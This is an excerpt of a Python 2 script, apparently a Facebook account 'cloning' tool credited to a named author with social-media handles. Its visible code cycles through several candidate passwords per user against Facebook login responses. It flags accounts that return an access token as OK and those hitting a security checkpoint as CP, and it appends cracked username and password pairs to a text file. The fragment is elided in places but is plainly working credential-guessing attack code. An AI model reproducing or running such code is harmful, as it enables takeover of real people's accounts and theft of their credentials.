...
\033[1;97m ##     ##    ##           ##### ## \033[1;0m
\033[1;97m--------------------------------------------------
\033[1;97m auther     : Niamatullah

\033[1;97m Facebook     : Niamatu baba

\033[1;97m Telegram name : @Niamatu12
...
#clone Password
        ...
        try:
            ...
            if 'access_token' in q:
                print ' \x1b[1;92m(Niamatu_OK) ' + k + c + user + ' | ' + pass1
                okb = open('Qasim.txt', 'a')
                okb.write(k + c + user + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print ' \x1b[1;91m(NiamatuðŸ˜¥_CP) ' + k + c + user + ' | ' + pass1
                ...
                if 'access_token' in q:
                    ...
                    print ' \x1b[1;91m(Niamatu_CP) ' + k + c + user + ' | ' + pass2
                    okb = open('Qasim.txt', 'a')
                    ...
                    q = json.load(data)
                    if 'access_token' in q:
                        print ' \x1b[1;92m(Niamatu_OK) ' + k + c + user + ' | ' + pass3
                        okb = open('Qasim.txt', 'a')
                        okb.write(k + c + user + pass3 + '\n')
                        okb.close()
                        oks.append(c + user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print ' \x1b[1;91m(Niamatu_CP) ' + k + c + user + ' | ' + pass3
                        cps = open('Qasim.txt', 'a')
                        ...
                        q = json.load(data)
                        if 'access_token' in q:
                            print ' \x1b[1;92m(Niamatu_OK) ' + k + c + user + ' | ' + pass4
                            okb = open('Qasim.txt', 'a')
                            okb.write(k + c + user + pass4 + '\n')
                            okb.close()
                            oks.append(c + user + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print ' \x1b[1;91m(Niamatu_CP) ' + k + c + user + ' | ' + pass4
                            cps = open('Qasim.txt', 'a')
                            ...
                            if 'access_token' in q:
                                ...
                                print ' \x1b[1;91m(Niamatu_CP) ' + k + c + user + ' | ' + pass5
                                cps = open('Qasim.txt', 'a')
                            ...
                            q = json.load(data)
                            if 'access_token' in q:
                                print ' \x1b[1;92m(Niamatu_OK) ' + k + c + user + ' | ' + pass6
                                okb = open('Qasim.txt', 'a')
                                okb.write(k + c + user + pass6 + '\n')
                                okb.close()
                                oks.append(c + user + pass6 )
                            elif 'www.facebook.com' in q['error_msg']:
                                print ' \x1b[1;91m(Niamatu_CP) ' + k + c + user + ' | ' + pass6
                                cps = open('Qasim.txt', 'a')
                            ...
                            q = json.load(data)
                            if 'access_token' in q:
                                print ' \x1b[1;92m(Niamatu_OK) ' + k + c + user + ' | ' + pass7
                                okb = open('Qasim.txt', 'a')
                                okb.write(k + c + user + pass7 + '\n')
                                okb.close()
                                oks.append(c + user + pass7 )
                            elif 'www.facebook.com' in q['error_msg']:
                                print ' \x1b[1;91m(Niamatu_CP) ' + k + c + user + ' | ' + pass7
                                cps = open('Qasim.txt', 'a')
